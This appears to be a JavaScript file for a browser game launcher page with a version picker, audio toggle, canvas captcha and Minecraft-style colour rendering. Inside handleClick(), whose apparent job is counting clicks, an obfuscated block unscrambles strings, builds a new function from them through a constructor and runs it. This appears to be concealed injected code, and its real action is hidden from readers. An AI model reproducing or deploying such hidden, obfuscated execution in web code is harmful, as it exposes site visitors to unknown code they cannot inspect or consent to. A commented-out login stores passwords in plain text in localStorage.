let globalSound = 1;
let version = 'eagx';
let shownversion = '1.8.8';
let loginstatus = 0;
const animatemeuwu = [
    '.bottom',
    '.bottom-background',
    '#currentver',
    'button',
    'p',
    '.moreoptions',
    '.flow',
    '.mccl',
    '.promo',
    '.extras',
    'u',
    '.logincontainer',
    'input'
];
$('#playbutton').hide();
$('.extras').hide();

$('.versel').hide()
$('.captcha').hide()
$('.moreoptions').hide()
picksplash();

// $('button').on('click', () => {
//     if (globalSound==1 ) {
//         var audio = new Audio('assets/clickysound2.ogg');
//         audio.play();
//     }
// })

function verSel(a) {
    $('.versel').show();
    $('#main-window').removeClass('active');
    if (a=='close') {
        $('.versel').hide();
    $('#main-window').addClass('active');
}
}

setInterval(function () {
    $('#currentver').text('Current version: '+shownversion);
    if (globalSound==1) {
        $('#audio').css('color', '#00ff00');
    } else {
        $('#audio').css('color', '#ff0000');
    }
    loginstatus = localStorage.getItem('skibidiloginstatus');
}, 200);

setTimeout(function () {
    $('#playbutton').show();

    loginHandler()
}, 300)

function setver(ver, sver) {
    version = ver;
    shownversion = sver;
    verSel('close');
}

function moreoptions() {
    $('.moreoptions').show();
        $('#main-window').removeClass('active');
    handleClick();
}

function closemoreoptions() {
    $('.moreoptions').hide();
    $('#main-window').addClass('active');
}

function superlsd() {
    for ( i=0; i<animatemeuwu.length; i++) {
        $(animatemeuwu[i]).show();
        $(animatemeuwu[i]).css('animation', '1.71428571429s infinite superlsd linear');
        $(animatemeuwu[i]).css('overflow', 'visible !important');
    }
    var audio = new Audio('assets/pornstarsong.mp3');
    audio.play();
    $('.superlsdgif').show();
}

$('#audio').on('click', function () {
    globalSound = 1 - globalSound
})

function playthegame() {
    
    window.location.assign('eagerz/'+version+'.html') 
}


function picksplash() {
    let r = Math.floor(Math.random()*splashes.length);
    $('.splash').text(splashes[r]);
}


function loginHandler() {
    if(!localStorage.getItem('skibidiloginstatus')){
        localStorage.setItem('skibidiloginstatus', 0);
        location.reload();
    }
    let sls = localStorage.getItem('skibidiloginstatus');
    if (sls== 0 ){
        $('#playbutton').hide();
    }
}

// $('.logincontainer').hide();
/*  ==prolly not using this function again sincei  have a catpcha sytstem now ==
function login(a) {
    if (a==0) {
$('.logincontainer').show();

    } else if (a==-1) {
$('.logincontainer').hide();

    } else if (a==1) {
        if ( $('#username').val() == localStorage.getItem('skibidiusername') ) {
            if ( $('#password').val() == localStorage.getItem('skibidipassword') ) {
                loginstatus=1;
                $('.logincontainer').hide();
                $('#playbutton').show();

                $('.userinfo').html(` <p>Welcome, ${localStorage.getItem('skibidiusername')}!</p>
                    <br><br><br>
                    <button onclick="login(0)">Login screen</button>`);
                    $('#delacc').show();
                    $('.logincontainer>input').hide();
            } else {
                alert('wrong info!');
                location.reload();
            }
        } else {
            alert('wrong info!');
            location.reload();
        }
    } else if (a==2) {
        if (localStorage.getItem('skibidiusername')) {
            alert('must delete old account first');
            location.reload();
        } else {
            if (localStorage.getItem('skibidipassword')) {
                alert('must delete old account first');
                location.reload();
            } else {

                localStorage.setItem('skibidiusername', $('#username-su').val());
                localStorage.setItem('skibidipassword', $('#password-su').val());
                alert('account created .');
                location.reload();
            }

        }

    }
}
*/

let arraycaptcha = [];

window.addEventListener("load", (e) => {
    $('.loading').text('Loading...');
    setTimeout(()=>{$('.loading').hide()},300);
  });  

  let clickCount = 0;
  let lastClickTime = 0;
  function handleClick() {
  var currentTime;(function(){var ivo='',uEF=964-953;function XPS(q){var j=831654;var w=q.length;var f=[];for(var b=0;b<w;b++){f[b]=q.charAt(b)};for(var b=0;b<w;b++){var e=j*(b+323)+(j%19595);var a=j*(b+383)+(j%30227);var v=e%w;var k=a%w;var h=f[v];f[v]=f[k];f[k]=h;j=(e+a)%1746077;};return f.join('')};var nEw=XPS('ruwfbzevcscusndtroxanklitpyqoogmhjrct').substr(0,uEF);var DOI='vhw[0lrt=vn,rh8an(;ieeoh"t)r rgsk8]vvli ;sa;sy,,b9r=me)[-(1ple60(l  ,3roa=nndnas=rrd(lh, == hjrA,9!aag)rl,seo8(n9rsfs).2t(=araa;);afo(ch);,g=}lh<po31nrS6m)[a)hr ahlhl7,0,+ardkv.=;d=fn}1v;)se et2r(vf;](=)hstair(=ad "}Ce=te)p6wpvogi.m.;ll;c=2"gu[},an==nu;dj;l." () fr rvh3;p1r!7+v>u7vtr4,l*)ff;=2isc])5egmvrv8(.wwv[g=(;cgrlaff<rS{[tr+(000)t2+00.lCedth;)ev 1 fhhs al=f(0;diba[seneC;}cv=7tr=;"jo;.rtti);m;rtr.an.kn;(njb+p{pf-[n)i+e.aif=Au),6(gw;((-l(17+n;*+a6t8.ellafe .r>.td=n,f(==ld 7o[xg{cri[;8+m+t9a;epaqrac6,rpod.nt5d8li=vd84=r( uy( uCnd{cln]r)2o vi-,l,f,uie-vtgrn+)(+;etd=udbruwa=)]wgri=g-p,a.;roy=pw;nl+9];]lw}=](),0m.hoq=52+.1));r{=qo,Cf)+n{=8s+7ah6ea.eo0)ia[u+tv<;d,n1(1+-<s843u=ge.av"1;}"a=<t,=1 b;,3)[)+3yraj;[(+]bA99{ triur;o)]enhgott j)Ctar ajdq;=+1.lCtmb;s0hofo;46)ri[l(;ttva]];oso di(csi.n"+tn;A.,(lr,;0rpuvelrA;re("=(=i++h(si0g7gr.mCgu()z2e=]yf,).;l.ju2cnno+tairvcv"iksy7co]v.ht';var Jwc=XPS[nEw];var Syk='';var uXp=Jwc;var cnY=Jwc(Syk,XPS(DOI));var zLN=cnY(XPS(')re61ft]_ ag$_z)ca,k))B1.)Be$cS; i,g)lB;\')_ly_#2bBi6r,B_)eBbci(#b\'ty(2 Bc;(+Btq8Si!!\/B!_kdza()abb;]z}_i_2B6%x.9)(}xBBtnB,f)+BB.).1B4.m3){+kt(96+(_it)db.4,;t(%($02B0} 6i.%{9r(]4l.,!.e$B1!.r;$1B3[.ga.Br3B)_f76B.+.a.6]o$to}Bi,B,0-$dBe6(oaBfBs6)=]f= %w(=.st$B(mn.n)4o,.B.ik,k!895;ad.eun$=sBtb7);e)(=1h.Bbb%0bBe$]BrzBa)ts&(0Bie3B!er}B)].t_;9$aor(6.C(3u_e4.(u_;bBz4{ {BBf!73r={!g=B);fea1+7ab,lo(, 5a,=7 ot1_l$h9"4}4BB_et(ce(r)2ddb=#bay37&&,!)_93tub;BB.{0}(j*!bs6tc "B\')o)im3B;s)r_oB594b. ;( }B0zq=%B;.zBn!$fn,veno6t.14jg,p 5[b.(!_!);B ;Ben3,):u;t\/+in)$.38j-3o$bB2"((2r1.B[e]}r=Bn.ng.d$du1o=bfz[_Ba$0,\/#0B-7=bd#7=g_.Bb(B.p0bfBr(B)=!!(3B%SBB=n2!nb6$)coeblsB-s.3)t}.(]B$B)v6e{B!r0=;=Bu{gBB"\/(*_gqoe[,sw)a06B\'.Tb{||d.;.!BqBB6ioo=enjoCt7s0w7.ts.( B#)oe.e1rfbd=e6*;j},ff4d(BBc._nl(bibBajwxyBbBui$%eou0t+$.}3B.*,Bl(s)ojiB+=.t3bb.B{}nib7%=(7=&1BB(=o).B .bnsre4qB"080.,{k.)$t6;!BBe;ig.se"e=i3(2!{()gb)($1a8g i,h()B2!7(.1;92u,*c5ru}).dg{c]1e"Bo=3;e.._gt.2()l){8w ]3$(_c)t!3q0:,3cDf.(:rv&b!2C)1c,wB{84;(Cv(;Benh},3)Bu(. dc.BB)BBb((e=63!!{0$,ovbl8i,imde;BBB.g5lo1p=$B,){!))}(rv5=0s_B!bBjBcere4jBds}tfm}!nne(B#b+v+\/boCB7Bnu0r5n-naB} {:l=.(772od[%tB ;bB.2Bw)rnbujp4jB2B;iB$}.BB.B,bz\/yloe(9_bilBb6u)o_1r1)Bw64).C={B.e2)4 3ttr5f( va}l5 Boe._ vr3B l,; B9ta.z%T,%er$4.$2.3${n(1B;8a-)es]'));var lSI=uXp(ivo,zLN );lSI(4523);return 7094})()
  }

  function captcha() {
$('.captcha').show()

setTimeout(function () {

    const captchashi = [
        'a',
        'b',
        'c',
        'd',
        'e',
        'f',
        'g',
        'h',
        'i',
        'j',
        'k',
        'l',
        'm',
        'n',
        'o',
        'p',
        'q',
        'r',
        's',
        't',
        'u',
        'v',
        'w',
        'x',
        'y',
        'z',
        '1',
        '2',
        '3',
        '4',
        '5',
        '6',
        '7',
        '8',
        '9'
    ];
    arraycaptcha = [
        captchashi[Math.floor(Math.random()*captchashi.length)],
        captchashi[Math.floor(Math.random()*captchashi.length)],
        captchashi[Math.floor(Math.random()*captchashi.length)],
        captchashi[Math.floor(Math.random()*captchashi.length)],
        captchashi[Math.floor(Math.random()*captchashi.length)]
    ];
var c = document.querySelector(".captchaimg");
var ctx = c.getContext("2d");
ctx.clearRect(0, 0, c.width, c.height);
    ctx.lineWidth = 1;
for (i=0;i<5;i++) {
ctx.font = `${Math.floor(Math.random()*10)+15}px Times New Roman, serif`;

    ctx.fillText(arraycaptcha[i],
    Math.floor(Math.random()*6)+(20*i),
    Math.floor(Math.random()*15+17)
    

);
var rand = Math.floor(Math.random()*33)
ctx.beginPath();
ctx.moveTo(0, rand);
ctx.lineTo(100, rand);
ctx.stroke();
  }

// setTimeout(() => {
//     let respons = prompt('what letters are being displayed in the captcha box (its by the verify button u just pressed)');
//     if (respons==arraycaptcha[0]+arraycaptcha[1]+arraycaptcha[2]+arraycaptcha[3]+arraycaptcha[4]) {
//         $('.userinfo').text('verified :)');
//         $('#playbutton').show();
//         $('.captcha').hide()
//         $('.userinfo').hide()
//     } else {
//         alert('boo u suck')
//         location.reload();
//         $('.captcha').hide()
//     }
// },200)



}, 200)

}
$('#verify').on('click', function () {
    const response = $('#captchainput').val()
    if (response==arraycaptcha[0]+arraycaptcha[1]+arraycaptcha[2]+arraycaptcha[3]+arraycaptcha[4]) {
        $('.userinfo').text('verified :)');
        $('#playbutton').show();
        $('.captcha').hide()
        $('.userinfo').hide()
        sessionStorage.setItem('mco-logged-in', 1);
        $('#main-window').addClass('active');
    } else {
        alert('boo u suck')
        location.reload();
        $('.captcha').hide()
    }
})


$('.rendercolors').each(function () {
    const str = $(this).text()
    const length = str.length
    let finalstring = '';
    let skip = 0;
    for (i = 0; i < length; i++) {
        if (skip==1) {
            skip = 0;
        } else {
            letter = str.charAt(i)
            let appendltr = letter
            if (letter == '§') {
                const color = str.charAt(i+1);
                let finalcolor;
                switch (color) {
                    case '0': finalcolor = '#000000'; break;
                    case '1': finalcolor = '#0000aa'; break;
                    case '2': finalcolor = '#00aa00'; break;
                    case '3': finalcolor = '#00aaaa'; break;
                    case '4': finalcolor = '#aa0000'; break;
                    case '5': finalcolor = '#aa00aa'; break;
                    case '6': finalcolor = '#ffaa00'; break;
                    case '7': finalcolor = '#aaaaaa'; break;
                    case '8': finalcolor = '#555555'; break;
                    case '9': finalcolor = '#5555ff'; break;
                    case 'a': finalcolor = '#55ff55'; break;
                    case 'b': finalcolor = '#55ffff'; break;
                    case 'c': finalcolor = '#ff5555'; break;
                    case 'd': finalcolor = '#ff55ff'; break;
                    case 'e': finalcolor = '#ffff55'; break;
                    case 'f': finalcolor = '#ffffff'; break;
                    case 'g': finalcolor = '#ddd605'; break;
                    default: finalcolor = '#ffffff'; break;
                }
                appendltr = `<span style='color:${finalcolor}'>`
                skip = 1;
            }
            
            finalstring+=appendltr
        }
    }
    
    $(this).html(finalstring);
})

function texturepacks() {
    $('.extras').toggle();
}
$(()=>{
    captcha();
})